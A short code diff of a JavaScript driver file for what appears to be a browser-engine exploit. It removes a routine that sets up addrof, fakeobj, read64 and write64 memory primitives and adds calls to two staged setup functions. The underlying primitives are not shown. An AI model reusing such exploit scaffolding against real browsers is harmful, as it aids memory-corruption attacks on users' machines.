@@ -1,31 +1,6 @@
 // main.js
 
-function log(msg) {
-    const logDiv = document.getElementById('log');
-    logDiv.textContent += msg + '\n';
-    void logDiv.offsetHeight;
-}
-
-// Kick off the exploit without blocking page load
-;(async function startExploit() {
-    // Yield to the browser for initial render
-    await new Promise(resolve => setTimeout(resolve, 100));
-    log('Starting exploit...');
-    try {
-        await runBaseSetup(log);
-        log('=== preparing memory primitives ===');
-
-        await initMemory(log);
-
-        log('Memory primitives initialized successfully.');
-
-        // Example usage of primitives:
-        let addr = addrof({});
-        let fake = fakeobj(addr);
-        let val = read64(addr);
-        write64(addr, 0x41414141n);
-        log(`Address: 0x${addr.toString(16)}, Fake Object: ${fake}, Value Read: 0x${val.toString(16)}`);
-    } catch(e) {
-        log('Exploit failed: ' + e);
-    }
-})();
+log("stage 1: leaking scope..");
+pirim_stage1();
+log("stage 2: exploit primitives setup..");
+pirim_stage2();
